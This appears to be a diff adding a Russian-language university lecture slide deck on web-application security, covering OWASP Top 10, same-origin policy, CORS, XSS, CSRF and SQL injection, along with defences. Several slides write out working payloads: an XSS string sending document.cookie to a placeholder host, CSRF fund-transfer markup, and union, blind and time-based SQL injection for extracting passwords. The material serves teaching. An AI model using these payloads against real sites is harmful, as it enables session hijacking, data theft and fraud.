@@ -1,0 +1,538 @@
+<!DOCTYPE HTML>
+<html lang="ru">
+<head>
+	<title>Web & DHTML - Безопасность веб-приложений</title>
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<link rel="stylesheet" href="shower/themes/ribbon/styles/screen.css">
+	<link rel="stylesheet" href="web-dhtml.css">
+	<style>
+		ul.compact li { line-height: 1.5 }
+		pre.compact code { line-height: 1.5 }
+		table.demo { border-collapse:separate; border-spacing:2px; font-size:smaller }
+		table.demo th { background:dodgerblue; text-align:center}
+		table.demo td { background:lightblue; text-align:center}
+	</style>
+</head>
+<body class="list">
+
+<header class="caption">
+	<h1>XML</h1>
+</header>
+
+<section class="slide cover" id="Cover"><div>
+	<h2>Web и DHTML<br>Безопасность</h2>
+	<h3 id="h31">Леонид Волканин</h3>
+	<h3 id="h32">ИМКН УрФУ</h3>
+	<div class="arrow"></div>
+	<img src="pictures/UrFULogo_Russian.png" alt="">
+</div></section>
+
+<section class="slide"><div>
+	<h2>Open Web Application Security Project</h2>
+	<p><a href="https://www.owasp.org/index.php/Top_10_2013-Table_of_Contents" target="_blank">OWASP.org — Top 10 2013</a></p>
+	<ul class="compact">
+		<li>A1-Injection</li>
+		<li>A2-Broken Authentication and Session Management</li>
+		<li>A3-Cross-Site Scripting (XSS)</li>
+		<li>A4-Insecure Direct Object References</li>
+		<li>A5-Security Misconfiguration</li>
+		<li>A6-Sensitive Data Exposure</li>
+		<li>A7-Missing Function Level Access Control</li>
+		<li>A8-Cross-Site Request Forgery (CSRF)</li>
+		<li>A9-Using Components with Known Vulnerabilities</li>
+		<li>A10-Unvalidated Redirects and Forwards	<ul>
+	</ul>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Разминка</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Постановка задачи</h2>
+	<p>Реализуем услугу «накрутка лайков» — <a href="https://www.google.ru/search?q=накрутка%20лайков" target="_blank">Google в курсе</a></p>
+	<p>Зачем? Во-первых, это поднимает самооценку :)</p>
+	<p>А вообще цель атакующего — заработать деньги</p>
+	<p>Итак, надо сделать так, чтобы пользователь выполнил какое-то действие или оно «само выполнилось» от его имени</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Компоненты веб-приложения</h2>
+	<p>Какой наиболее уязвимый?</p>
+	<p><img src="pictures/web-app-components.jpg" width="100%"></p>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Сторона пользователя</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Атаки на механизмы аутентификации</h2>
+	<ul>
+		<li>Подбор учётных данных</li>
+		<li>Подбор идентификатора сессии</li>
+		<li>Подбор названий директорий и файлов</li>
+		<li>Подбор критичных данных в полях ввода</li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Социальная инженерия</h2>
+	<p>Фишинг (англ. phishing, от fishing — рыбная ловля): <a href="http://habrahabr.ru/company/pentestit/blog/271123/" target="_blank">примеры</a></p>
+	<p><img src="pictures/web-security-phishing.png" width="100%"></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Подмена содержимого</h2>
+	<p>Некоторые страницы создаются с использованием динамических источников HTML-кода</p>
+	<p>Напр., расположение фрейма (&lt;frame src=" http://test.ru/file.html"&gt;) может передаваться в параметре URL: <nobr>http://test.ru/page?frame_src=http://test.ru/file.html</nobr></p>
+	<p>Атакующий может заменить значение параметра, в строке адреса будет отображаться правильный адрес, но будет присутствовать внешнее содержимое, замаскированное под легальный контент</p>
+	
+</div></section>
+
+<section class="slide"><div>
+	<h2>Так не бывает?</h2>
+	<p>Сайт ФБР (www.fbi.gov) работает на CMS Plone (Python + ZODB)</p>
+	<p>Публикация сайта через nginx:</p>
+	<pre class="compact">
+		<code>server {</code>
+		<code>  listen 80;</code>
+		<code>  server_name yoursite.com www.yoursite.com;</code>
+		<code>  location / {</code>
+		<code>    proxy_pass</code>
+		<code style="font-size:smaller">http://127.0.0.1:8080/VirtualHostBase/http/<mark>yoursite.com:80</mark>/Plone/VirtualHostRoot/;</code>
+		<code>  }</code>
+		<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>У них есть печеньки!</h2>
+	<p>Идентификатор сессии сохраняется в cookie, скрытых полях форм / URL</p>
+	<p>Можно украсть идентификатор авторизованной сессии (<b>фиксация сессии</b>) или <b>предсказать</b> его (вычислить или подобрать следующий идентификатор сессии)</p>
+	<p><code>document.cookie</code> — решение задачи по атаке? А сервер пришлёт <code>HttpOnly</code>. Сниффер? Сервер может прислать <code>Secure</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Можно ли украсть данные из фрейма?</h2>
+	<pre>
+		<code>&lt;html&gt;&lt;head&gt;&lt;script&gt;</code>
+		<code>	function steal(){</code>
+		<code>		wnd = document.querySelector("#gmail"); alert(wnd);</code>
+		<code>		alert(wnd.contentDocument.body.innerHTML);</code>
+		<code>	}</code>
+		<code>&lt;/script&gt;&lt;/head&gt;</code>
+		<code>&lt;body&gt;&lt;iframe src="gmail.com" id="gmail" onload="steal()"&gt;</code>
+		<code>&lt;/body&gt;&lt;/html&gt;</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Не работает :(</h2>
+	<p><button onclick="wnd = document.querySelector('#gmail'); alert(wnd); alert(wnd.contentDocument.body.innerHTML)">Проверить</button></p>
+	<iframe src="http://gmail.com" id="gmail" width="100%" height="100%"></iframe>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Работает !!!</h2>
+	<p><button onclick="wnd = document.querySelector('#local'); alert(wnd); alert(wnd.contentDocument.body.innerHTML)">Проверить</button></p>
+	<iframe src="00-Intro.html" id="local" width="100%" height="100%"></iframe>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Принцип одинакового источника</h2>
+	<p>Same Origin Policy — разрешает сценариям одного сайта доступ к методам и свойствам друг друга, но предотвращает доступ к большинству методов и свойств для страниц на разных сайтах</p>
+	<p>Одинаковые источники — совпадают <b>домен, порт, протокол</b></p>
+	<p>Т.е., со страницы http://site.com нельзя сделать запрос на адрес https://site.com, http://site.com:8080 или http://othersite.com</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>И так не будет работать</h2>
+	<pre>
+		<code>var xhttp = new <mark>XMLHttpRequest</mark>();</code>
+		<code>xhttp.open("GET","http://pogoda.e1.ru/print/", false);	// sync</code>
+		<code>xhttp.send();</code>
+		<code>var text = xml.responseText;</code>
+	</pre>
+	<p><button onclick="var xhttp = new XMLHttpRequest(); xhttp.open('GET','http://pogoda.e1.ru/print/',false);xhttp.send();alert(xml.responseText)">Проверить</button>
+	— откройте консоль</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Cross-Origin Resource Sharing (CORS)</h2>
+	<p>запрос: <code>Origin: http://site.com</code></p>
+	<p>ответ: <code>Access-Control-Allow-Origin: http://site.com</code></p>
+	<p>чаще даже так — <code>Access-Control-Allow-Origin: *</code></p>
+	<pre style="margin:0">
+		<code>var xhttp = new XMLHttpRequest();</code>
+		<code>xhttp.open("GET","<mark>https://api.github.com/users/volkanin/repos</mark>", false);	// sync</code>
+		<code>xhttp.send(); <button onclick="var xhttp = new XMLHttpRequest(); xhttp.open('GET','https://api.github.com/users/volkanin/repos',false);xhttp.send();alert(xhttp.responseText)">Проверить</button></code>
+	</pre>
+	<p><a href="http://www.w3.org/TR/cors/" target="_blank">www.w3.org/TR/cors</a></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Борьба с поддоменами на клиенте</h2>
+	<ul style="margin-bottom:1ex">
+		<li>статический контент на поддоменах (в т.ч. CDN) для ускорения</li>
+		<li>разные проекты (auto.e1.ru, mail.e1.ru)</li>
+	</ul>
+	<p>Кросс-доменные запросы с поддомена a.site.com на базовый домен site.com допустимы при установке одинакового значения свойства <code>document.domain</code></p>
+	<pre style="margin:0">
+		<code>// на странице auto.e1.ru</code>
+		<code>document.domain = "e1.ru";</code>
+		<code>xhttp.open("GET","http://e1.ru/news.php");</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Вернёмся к задаче</h2>
+	<p>Итак, без явного разрешения атакующий не сможет получить извне доступ к данным окна браузера у пользователя</p>
+	<p>Значит, надо запустить код в контексте того же самого окна !</p>
+	<p style="font-size:smaller">Уважаемый получатель, Вы только что получили вирус "ТАЛИБАН". Поскольку мы в Афганистане не так уж и продвинуты в технологиях - этот вирус следует исполнять вручную. Пожалуйста, перешлите это письмо всем, кого знаете, и уничтожьте все файлы на Вашем жестком диске собственноручно. Большое спасибо за помощь. Абдулла, хакер из Талибана</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XSS — Cross Site Scripting</h2>
+	<p>Межсайтовое выполнение сценариев</p>
+	<p>Передача серверу HTML-кода, содержащего сценарии, которые впоследствии выполняются браузером клиента</p>
+	<p>Различают два варианта XSS</p>
+	<ul>
+		<li>Отражённый (non-persistent)</li>
+		<li>Сохранённый (persistent)</li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Non-persistent XSS</h2>
+	<p><code>/search?q=<mark>"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</mark></code></p>
+	<p>Обычно в результате поиска выводится искомая строка:</p>
+	<pre>
+		<code>&lt;input type="text" name="q"</code>
+		<code>	value="<mark>"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</mark>"&gt;</code>
+	</pre>
+	<p>Можно быть скромнее и просто отправить <code>document.cookie</code> на свой сервер</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Persistent XSS</h2>
+	<p><img src="pictures/web-security-persistent-xss.png" width="100%"></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Где встречается XSS?</h2>
+	<ul>
+		<li>HTML-теги</li>
+		<li>Атрибут тега HTML</li>
+		<li>Тело JavaScript (он же DOM-based)</li>
+		<li>Код HTML</li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Пример использования</h2>
+	<p>Возможный метод обнаружения уязвимости<br><code>/?q=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+	<p>HTML-код возвращаемой страницы примет вид:</p>
+	<p>В атрибуте<code>&lt;input value=&quot;<mark>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</mark>&quot;</code></p>
+	<p>В тексте <code>&lt;p&gt;<mark>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</mark>&lt;/p&gt;</code></p>
+	<p>Пример практического использования:<br><code>&quot;&gt;&lt;script src=http://host/script.js&gt;&lt;/script&gt;</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Пример использования</h2>
+	<p>Уязвимый код: <code>&lt;img src="$filename"&gt;</code></p>
+	<p>Эксплуатация:
+	<code>/?filename="onerror=alert('XSS');"</code> или 
+	<code>/?filename="onerror=javascript:alert('XSS');"</code>
+	</p>
+	<p>HTML-код возвращаемой страницы примет вид:<br><code>&lt;img src=""onerror=alert('XSS');""&gt;</code></p>
+	<p>Пример: <code>/?filename="onerror="new/**/Image().src= 'http://host/sniff?c='%2Bescape(document.cookie);"</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Пример использования (DOM-based)</h2>
+	<p>Уязвимый код:</p>
+	<pre>
+	<code>&lt;select&gt;&lt;script&gt;</code>
+	<code>document.write(&quot;&lt;option value=1&gt;&quot;+</code>
+	<code>  document.location.href.substring(</code>
+	<code>    document.location.href.indexOf(</code>
+	<code>      &quot;default=&quot;)+8)+&quot;&lt;/option&gt;&quot;);</code>
+	<code>document.write(&quot;&lt;option value=2&gt;English&lt;/option&gt;&quot;);</code>
+	<code>&lt;/script&gt;&lt;/select&gt;</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Пример использования (DOM-based)</h2>
+	<p>Штатная работа сценария: <code>/?default=Russia</code></p>
+	<p>Эксплуатация:<br><code>/?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Способы кодирования JavaScript</h2>
+	<p>Пример: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+	<p>Hex-кодирование (URL): <code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E</code></p>
+	<p>HTML-кодирование: <code>&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;
+	&amp;#x74;&amp;#x3E;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74; ...</code></p>
+	<p><a href="sample/10-Security-UTF-7.html" target="_blank">UTF-7</a>:
+	<code>+ADw-script+AD4-alert('1');+ADw-/script+AD4-</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XSS: Как бороться?</h2>
+	<p><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank">owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></p>
+	<h2>Как проверяться?</h2>
+	<p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Tests" target="_blank">owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Tests</a></p>
+	<p><code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}</code></p>
+	<p><code style="font-size:smaller">&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&quot;;
+	alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
+	&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Cross-Site Request Forgery (CSRF, XSRF)</h2>
+	<p>Уязвимость «Подделка HTTP-запросов»</p>
+	<p>Вид атаки, использующий функцию браузера по автоматической отправке идентификатора сессии с каждым GET/POST-запросом к веб-приложению</p>
+	<p>Сложности при автоматизированном обнаружении, однако эта ошибка встречается во многих веб-приложениях</p>
+	<p>Часто применяется связка XSS + CSRF</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>CSRF: как это работает</h2>
+	<p>Пусть наш банк имеет API :) <code>http://example.com/app/transferFunds?amount=1500&destAccount=12345</code></p>
+	<p>Разместим где-нибудь на форуме поддержки картинку ... PROFIT ! <code>&lt;img src="http://example.com/app/transferFunds?amount=1500&destAccount=12345"/&gt;</code></p>
+	<p>А можно просто «от имени пользователя» голосовать ВКонтакте</p>
+	<p>Читали историю «<a href="http://www.thedailywtf.com/articles/The_Spider_of_Doom" target="_blank">The Spider of Doom</a>»?</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>CSRF: Как бороться?</h2>
+	<p>Уникальный непредсказуемый токен в каждом HTTP-запросе</p>
+	<ul style="margin:0">
+		<li>в скрытом поле формы (не светится в URL)</li>
+		<li>CMS часто автоматически включают в URL</li>
+		<li>Привязка cookie к IP/браузеру и др. Требование повторной аутентификации при подозрениях, и CAPTCHA</p>
+	</ul>
+	<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank">owasp.org/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</a></p>
+	<p>Верить в наше время нельзя никому, порой даже самому себе. (Мюллер)</p>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Доступ к данным в СУБД</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>SQL Injection (Внедрение SQL-кода)</h2>
+	<p>Метод обхода логики приложения и получения непосредственного доступа к данным путем внедрения во входную информацию, обрабатываемую приложением, операторов языка SQL</p>
+	<p><img src="pictures/xkcd_327.png"></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>SQL Injection</h2>
+	<p>Запрос: <code>http://Server/news?id=1</code></p>
+	<p>Предполагается, что из БД извлекаем данные примерно так:<br><code>SELECT * FROM news WHERE id=1</code><p>
+	<p>А что в приложении? Вы уже взрослые, так что показываем как есть...</p>
+	<pre>
+		<code>id = Request.querystring("id") или $_GET['id']</code>
+		<code>SQL_query = "SELECT * FROM news WHERE id="<mark>+id</mark></code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Возможное использование</h2>
+	<p><code>http://Server/news?id=<mark>1;delete+from+news</mark></code></p>
+	<p><code>http://Server/news?id=<mark>1+union+select+id,pwd+from</mark></code></p>
+	<p>База знаний — <a href="http://websec.ca/kb/sql_injection" target="_blank">websec.ca/kb/sql_injection</a></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Последствия внедрения SQL-кода</h2>
+	<ul>
+		<li>Обход ограничений пользовательского ввода</li>
+		<li>Получение доступа к данным</li>
+		<li>Модификация данных</li>
+		<li>Получение доступа к файловой системе</li>
+	<ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Разновидности внедрения SQL-кода</h2>
+	<ul>
+		<li>Обычное</li>
+		<li>Слепое</li>
+		<ul>
+			<li>Blind</li>
+			<li>Double Blind</li>
+		</ul>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Обычное внедрение SQL-кода</h2>
+	<p>Обнаружение уязвимости <code>/?id=1+ORDER+BY+100</code></p>
+	<p>SQL запрос примет вид <code>SELECT id, name FROM table WHERE id=1 ORDER BY 100</code></p>
+	<p>В результате может быть получено следующее сообщение об ошибке <samp>ERROR 1054 (42S22): Unknown column '100' in 'order clause'</samp></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Обычное внедрение SQL-кода</h2>
+	<p>Получение имен таблиц/колонок (information_schema/перебор) и последующее получение данных из найденных таблиц
+	<code>/?id=1+union+select+0,concat_ws(0x3a,table_name,column_name)+ from+information_schema.columns</code></p>
+	<p>В результате может быть получена требуемая информация в формате</p>
+	<pre>
+		<code>| 0 | table1:column1 |</code>
+		<code>| 0 | table1:column2 |</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Различия в СУБД</h2>
+	<table class="demo">
+	<tr>
+		<td></td>
+		<td>MySQL</td>
+		<td>MSSQL</td>
+		<td>MS Access</td>
+		<td>Oracle</td>
+		<td>DB2</td>
+		<td>PostgreSQL</td>
+	</tr>
+	<tr>
+		<td>Объединение строк</td>
+		<td>concat(,)<br>concat_ws(delim,)</td>
+		<td>' '+' '</td>
+		<td>" "&" "</td>
+		<td>' '||' '</td>
+		<td>" "+" "<br>' '||' '</td>
+		<td>' '||' '</td>
+	</tr>
+	<tr>
+		<td>Комментарии</td>
+		<td>-- и /**/ и #</td>
+		<td>-- и /*</td>
+		<td>Нет</td>
+		<td>-- и /*</td>
+		<td>--</td>
+		<td>-- и /*</td>
+	</tr>
+	<tr>
+		<td>Объединение запросов</td>
+		<td>union</td>
+		<td>union и ;</td>
+		<td>union</td>
+		<td>union</td>
+		<td>union</td>
+		<td>union и ;</td>
+	</tr>
+	<tr>
+		<td>Подзапросы</td>
+		<td>v.4.1 >=</td>
+		<td>Да</td>
+		<td>Нет</td>
+		<td>Да</td>
+		<td>Да</td>
+		<td>Да</td>
+	</tr>
+	<tr>
+		<td>Хранимые процедуры</td>
+		<td>Нет</td>
+		<td>Да</td>
+		<td>Нет</td>
+		<td>Да</td>
+		<td>Нет</td>
+		<td>Да</td>
+	</tr>
+	<tr>
+		<td>Наличие information_schema или его аналога</td>
+		<td>v.5.0 >=</td>
+		<td>Да</td>
+		<td>Да</td>
+		<td>Да</td>
+		<td>Да</td>
+		<td>Да</td>
+	</tr>
+	</table>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Blind SQL Injection</h2>
+	<p>Главная сложность: отсутствует сообщение об ошибке</p>
+	<p>Эксплуатируя уязвимость SQL Injection «слепым» методом, атакующий манипулирует логикой работы приложения (да/нет)</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Blind SQL Injection</h2>
+	<p>Способы обнаружения</p>
+	<pre>
+		<code>http://site/?param=-1 OR 1=1</code>
+		<code>http://site/?param=-1 OR 1=1--</code>
+		<code>http://site/?param=-1'</code>
+		<code>http://site/?param=-1' AND 1=2</code>
+		<code>http://site/?param=-1' OR '1'='1</code>
+		<code>http://site/?param=-1"/*</code>
+		<code>http://site/?param=1' AND 1=1</code>
+		<code>http://site/?param=1' AND '1'='1</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Использование Blind SQL Injection</h2>
+	<p>Подбор первого символа у первой записи в таблице <code>/?id=1+AND+555=if(ord(mid((select+pass+from+users+ limit+0,1),1,1))=97,555,777)</code></p>
+	<p>SQL запрос примет вид <code>SELECT id, name from table where id=1 AND 555=if(ord(mid((select pass from users limit 0,1),1,1))=97,555,777)</code></p>
+	<p>В случае, если таблица users содержит колонку pass и первый символ первой записи этой колонки равен 97 (символ «a»), СУБД вернет TRUE</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Double Blind SQL Injection</h2>
+	<p>Эксплуатация уязвимости основана на временных задержках</p>
+	<p>Классическая реализация: <code>/?id=1+AND+if((ascii(lower( substring((select password from user limit 0,1) ,0,1))))=97,1,benchmark(2000000,md5(now())))</code></p>
+	<p>На основе  задержки ответа от web-сервера можно сделать вывод, что подбираемый символ угадан</p>
+	<p>Аналог benchmark() - sleep() более предпочтительна для подобных целей, т.к. не использует процессорные ресурсы</p>
+</div></section>
+
+
+
+
+
+
+
+<section class="slide shout"><div>
+	<h2>Потренироваться?</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Extremely Buggy Web App</h2>
+	<p>Только сегодня! Больше 100 багов на PHP и MySQL!</p>
+	<p>bWAPP — http://www.itsecgames.com/</p>
+	<hr>
+	<p>https://www.vulnhub.com/</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Open Web Application Security Project</h2>
+	<p><a href="https://www.owasp.org/index.php/Top_10_2013-Table_of_Contents" target="_blank">OWASP.org — Top 10 2013</a></p>
+	<ul class="compact">
+		<li>A1-Injection</li>
+		<li>A2-Broken Authentication and Session Management</li>
+		<li>A3-Cross-Site Scripting (XSS)</li>
+		<li>A4-Insecure Direct Object References</li>
+		<li>A5-Security Misconfiguration</li>
+		<li>A6-Sensitive Data Exposure</li>
+		<li>A7-Missing Function Level Access Control</li>
+		<li>A8-Cross-Site Request Forgery (CSRF)</li>
+		<li>A9-Using Components with Known Vulnerabilities</li>
+		<li>A10-Unvalidated Redirects and Forwards	<ul>
+	</ul>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Вопросы?</h2>
+</div></section>
+
+<div class="progress"><div>
+<script src="shower/shower.min.js"></script>
+
+</body>
+</html>
